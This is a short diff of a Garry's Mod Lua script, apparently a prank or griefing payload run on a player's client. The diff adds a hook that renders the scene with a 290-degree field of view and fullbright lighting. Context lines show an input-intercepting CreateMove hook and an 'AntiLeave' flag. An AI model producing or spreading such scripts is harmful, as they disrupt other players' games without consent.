@@ -240,6 +240,25 @@ _hook.Add('Think','funny',function()
     end
 end)
 local pweps = LocalPlayer():GetWeapons()
+_hook.Add('RenderScene','funny',function()
+
+        local view = {
+        x = 0,
+        y = 0,
+        w = ScrW(),
+        h = ScrH(),
+        dopostprocess = true,
+        origin = vOrigin,
+        angles = vAngle,
+        fov = 290,
+        drawhud = false,
+        drawmonitors = true,
+        drawviewmodel = true
+        }
+    render.SetLightingMode(1)
+    render.RenderView(view)
+
+end)
 _hook.Add('CreateMove','funny',function( CUserCmd , GM ) 
     if _o then return else
 
@@ -257,8 +276,9 @@ end)
 _timer.Create("hahafinal", 4000006, 1, function() 
     Song = false
     
-    _hook.r('CreateMove','funny')
-    _hook.r('Think','funny')
+    _hook.Remove('CreateMove','funny')
+    _hook.Remove('Think','funny')
+    _hook.Remove('RenderScene','funny')
     AntiLeave = false
     _timer.r("haha")
     _timer.r("haha2")
